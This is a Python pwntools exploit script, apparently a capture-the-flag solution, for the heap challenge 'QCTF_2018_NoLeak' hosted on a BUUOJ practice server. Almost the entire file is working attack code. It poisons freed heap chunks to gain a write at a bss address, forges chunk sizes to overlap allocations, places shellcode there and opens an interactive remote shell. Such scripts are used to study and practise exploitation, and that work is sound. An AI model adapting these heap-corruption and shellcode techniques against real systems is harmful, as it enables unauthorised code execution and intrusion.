# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './QCTF_2018_NoLeak'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '26512'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

def add(size , text = 'a'):
    cmd(1)
    sla('Size:' , size)
    sa('Data:' , text)

def edit(idx ,size, text):
    cmd(3)
    sla('Index:' , idx)
    sla('Size:' , size)
    sa('Data:' , text)

def delete(idx ):
    cmd(2)
    sla('Index:' , idx)

# one_gad = one_gadget(libc.path)

def attack():
    
    bss_addr = 0x601000

    add(0x18 , 'a')
    add(0x88)
    add(0x408)
    add(0x48)

    delete(3)
    edit(3 ,0x8 , p64(bss_addr) )
    add(0x48)
    add(0x48 , asm(shellcraft.sh()))

    delete(1)
    edit(0 , 0x100 , flat(0,0,0,0x90 + 0x410 + 1 , 0,0))
    delete(1)
    edit(1 , 0x1 , '\x30')

    add(0x88)
    add(0x88 , p64(bss_addr))

    cmd(1)
    sla('Size:' , 0x50)

    # dbg()

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   QCTF_2018_NoLeak.py
@Time    :   2022/02/10 17:10:03
@Author  :   Niyah 
'''